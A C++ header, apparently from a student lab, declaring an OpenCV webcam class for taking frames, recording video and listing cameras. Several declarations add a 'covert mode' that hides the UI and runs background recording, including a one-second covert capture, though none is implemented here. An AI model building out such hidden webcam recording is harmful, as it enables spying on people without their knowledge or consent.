#ifndef LAB_04_HPP
#define LAB_04_HPP

#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <filesystem>
#include <opencv2/opencv.hpp>

#ifdef _WIN32
#include <windows.h>
#endif

struct CameraInfo {
    int index;
    std::string name;
    int width;
    int height;
    double fps;
    bool isOpened;
};

class CameraCapture {
private:
    cv::VideoCapture cap;
    cv::VideoWriter videoWriter;
    bool isRecording;
    std::string videoFilename;
    int cameraIndex;
    std::string lastTempFramePath;  // Track the last temporary frame for immediate deletion
    std::thread recordingThread;    // Thread for continuous video recording
    std::atomic<bool> recordingActive{false};  // Flag for recording thread
    
public:
    CameraCapture(int index = 0);
    ~CameraCapture();
    
    // Method to take a frame from webcam and save it immediately
    std::string takeFrame();
    
    // Method to start recording
    bool startRecording(const std::string& filename, double fps = 30.0);
    
    // Method to stop recording
    std::string stopRecording();
    
    // Check if camera is opened
    bool isOpened() const;
    
    // Get the current frame from camera (without saving)
    cv::Mat getCurrentFrame();
    
    // Get information about the current camera
    CameraInfo getCameraInfo() const;
    
    // List all available cameras
    static std::vector<CameraInfo> listAvailableCameras();
    
    // Toggle covert mode (hides UI elements)
    static bool setCovertMode(bool enabled);
    
    // Start covert recording (runs in background without UI)
    bool startCovertRecording(const std::string& filename, double fps = 30.0);
    
    // Stop covert recording
    std::string stopCovertRecording();
    
    // Perform 1-second covert recording (runs in background and stops automatically)
    void oneSecondCovertRecording(const std::string& filename, double fps = 30.0);
    
    // Get current frame as a temporary file (for preview, will be auto-deleted)
    std::string getCurrentTempFrame();
};

#endif // LAB_04_HPP